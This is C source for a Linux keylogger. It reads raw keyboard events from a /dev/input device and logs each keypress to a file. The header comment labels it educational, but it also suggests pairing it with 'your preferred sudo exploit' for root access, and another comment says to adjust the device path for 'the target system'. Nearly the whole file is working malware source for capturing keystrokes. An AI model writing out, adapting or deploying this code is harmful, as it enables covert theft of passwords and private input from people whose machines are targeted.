/*
   A very simple keylogger for Linux in C
   Reads the keyboard device buffer at /dev/input/event*
   Needs root privileges, so use with your preferred sudo exploit ;)
   To keep things simple, it terminates upon pressing ESC

   This is for educational purposes only
*/

#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/stat.h>
#include <linux/input.h>
#include <linux/input-event-codes.h>

#include "keylogger.h"

int main(void)
{
    // change the device path according to the target system
    char *dev = "/dev/input/by-id/usb-SONiX_USB_DEVICE-event-kbd";
    char *logfile = "/home/simon/keylog";
    int fd = 0;         // fd of the character device
    FILE *fp = NULL;    // fp of the logfile
    struct stat sb;
    struct input_event ev;
    unsigned int index = 0;
     
    // check if file is actually a character device
    stat(dev, &sb);
    if (S_ISCHR(sb.st_mode) == 0) {
        printf("%s is not a character device\n", dev);
        return EXIT_FAILURE;
    }

    // open the keyboard character file (returns a file descriptor)
    fd = open(dev, O_RDONLY);
    if (fd == -1) {
        printf("Failed to open file %s\n", dev);
        return EXIT_FAILURE;
    }

    // open the logfile
    fp = fopen(logfile, "w");
    if (fp == NULL) {
        printf("Failed to open logfile %s\n", logfile);
        return EXIT_FAILURE;
    }

    for (;;) {
        // read the keyboard buffer
        read(fd, &ev, sizeof ev);
        /*
           the input_event struct has the following fields:
           struct input_event {
               struct timeval time;
               unsigned short type; // Type of event, we want EV_KEY
               unsigned short code; // Key code in LKC standard
               unsigned int value;  // 0 = released; 1 = pressed; 2 = repeated
           };
        */
        if (ev.type == EV_KEY && ev.value == 1) {
            // insert a newline afer 100 characters or KEY_ENTER
            if (index == 100 || ev.code == KEY_ENTER) {
                fprintf(fp, "%s\n", translate_keycode(ev.code));
                index = 0;
            }
            else {
                fprintf(fp, "%s", translate_keycode(ev.code));
                index ++;
            }
            fflush(fp);

            if (ev.code == KEY_ESC) {
                break;
            }
        }
    }

    close(fd);
    fclose(fp);
    fflush(stdout);

    return EXIT_SUCCESS;
}
